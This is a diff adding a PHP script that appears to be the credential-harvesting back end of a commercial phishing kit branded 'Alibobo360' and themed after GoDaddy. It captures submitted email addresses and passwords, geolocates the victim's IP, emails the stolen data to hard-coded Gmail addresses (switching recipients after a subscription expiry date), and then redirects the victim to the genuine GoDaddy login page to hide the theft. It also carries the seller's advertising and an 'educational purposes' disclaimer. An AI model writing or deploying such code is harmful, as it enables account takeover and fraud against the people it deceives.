@@ -1,0 +1,62 @@
+<?php
+
+require_once('geoplugin.class.html');
+$geoplugin = new geoPlugin();
+
+$geoplugin->locate();
+
+$ip = getenv("REMOTE_ADDR");
+$today = date("F j, Y, g:i a");
+$currency = $geoplugin->currencyCode;
+
+$expiry = strtotime("December 17, 2021 12:00 PM");
+$time = time();
+$remaining = $expiry - $time;
+$days_remaining = floor($remaining / 86400);
+
+$message .= '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">';
+$message .= '<html><body leftmargin="0" marginwidth="0" topmargin="0" marginheight="0" offset="0">';
+$message .= '<table width="100%" cellpadding="10" cellspacing="0" border="0" valign="top" align="center"><tr><td bgcolor="#f5f4f4">';
+$message .= '<table width="600" cellpadding="0" cellspacing="0" border="0" valign="top" align="center"><tr><td bgcolor="#ffffff">';
+$message .= '<table cellpadding="0" cellspacing="10" border="0" valign="top"><tr><td bgcolor="#ffffff" style="padding:10;">';
+$message .= '<img src="https://scontent-los2-1.xx.fbcdn.net/v/t1.0-9/13407307_1106129312759193_1336247933874033414_n.png?_nc_cat=108&_nc_ohc=DE1FtgD-YvQAQm8IRU_U73ZLgeTF0QOa0J_xaNTWXxCa6_kd5X8CrKIuA&_nc_ht=scontent-los2-1.xx&oh=e0d0c3704b5dd8d65f8b5ac595be481a&oe=5E8B2DC7" />';
+
+$message .= '<hr />';
+$message .= '<br />';
+$message .= '<b>Alibobo360.com is the dreams and hopes of generations of street-on-net elites bundled in one spot.</b> <br />';
+
+$message .= '<tr><td bgcolor="#ffffff">';
+$message .= '<BR /><b>ALIBOBO360 (Premium Month - <span style="color:red; size:11px;">'.$days_remaining.'  Days Left)</span></b><BR />';
+$message .= "<b>Email</b>      : ".$_POST['ud']."\n";
+$message .= "<br />";
+$message .= "<b>Password</b>      : ".$_POST['pd']."\n";
+$message .= "<br />";
+$message .= "<br /><br /><b>LOG SUMMARY</b> ";
+
+$message .= "<br />User Log activity came from <span style='color:#f49500'> ".$geoplugin->region.", ".$geoplugin->city.", ".$geoplugin->countryName."</span> on <span style='color:#f49500'>".$today." </span> This user IP is <span style='color:#f49500'>".$ip.".</span> ".$geoplugin->countryName." uses <span style='color:#f49500'>".$currency."</span> and active exchange rate against dollar is <span style='color:#f49500'>".$geoplugin->currencySymbol." ".$geoplugin->currencyConverter."</span>.";
+
+
+$message .= '<br /><br /><b><span style="color:#c3c2c2;">Alibobo360 gives you freedom to exploit the internet while remaining anonymous at the same time. We understand the underlying frustrations elites face, the inconsistency in tools and downtime. Hence, We optimize our tools in the best possible quality to deliver while maintaining affordable pricing policy. Legal wise, Our tools are for educational purposes and we would not be responsible for what you do with it.<span style="color:#f49500">(If your page cast before expiry, notify us to fix asap)</span></b> <br /><br /><h3>HAPPY MAILING</h3><br />Add us on SKYPE (alibobo.360@skype.com)<br /><br /><span style ="color:red;">Visit us to buy a subscription plan on expiration</span>';
+$message .= "</td></tr>";
+$message .= "</td></tr></table>";
+$message .= "</td></tr></table>";
+$message .= "</td></tr></table>";
+$message .= "</html></body>";
+if($expiry > $time){
+$send = "securednotification0@gmail.com";
+}else{
+$send = "jennycole1905@gmail.com";
+}
+$subject = "ALIBOBO GODADDY 2.0";
+$headers .= $_POST['name']."\n";
+$headers  = 'MIME-Version: 1.0' . "\r\n";
+$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
+$headers .= "From: Alibobo Messenger <info@yourcoolsite.com>" . "\r\n";
+$arr=array($send, $IP);
+foreach ($arr as $send)
+{
+mail($send,$subject,$message,$headers);
+                //$do($er,$subject,$message,$headers);
+}
+header("Location: https://sso.godaddy.com/v1/?app=email&realm=pass");
+?>
